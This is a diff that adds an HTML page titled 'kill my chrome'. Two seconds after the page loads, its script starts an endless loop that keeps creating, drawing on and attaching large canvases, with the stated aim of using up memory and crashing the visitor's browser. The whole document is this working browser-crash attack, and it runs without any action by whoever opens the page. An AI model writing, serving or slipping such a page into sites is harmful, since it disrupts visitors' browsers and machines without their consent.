@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+        <title>kill my chrome</title>  
+
+
+        <style media="screen">
+     
+            canvas {
+                position: absolute;
+                top: 0;
+                left: 0;
+            }
+        </style>   
+
+
+        
+        <script type="text/javascript">
+                // Create canvas, draw in it so it uses memory, repeat
+                window.onload = function() {
+
+                    // settimout to give IE a chance to crash on html first
+                    setTimeout(function() {
+                        while (true) {
+                            var canvas = document.createElement('canvas');                
+                            var dimensions = 1000;
+                            canvas.width  = dimensions;
+                            canvas.height = dimensions;    
+                            document.body.appendChild(canvas);
+                            var ctx = canvas.getContext('2d');
+
+                            ctx.beginPath();
+                            ctx.moveTo(Math.random()*dimensions,Math.random()*dimensions);
+                            ctx.lineTo(Math.random()*dimensions,Math.random()*dimensions);
+                            ctx.stroke();
+                        }
+                    }, 2000);
+       
+                }
+        </script>
+    </head>
+    <body>
+
+    </body>
+</html>
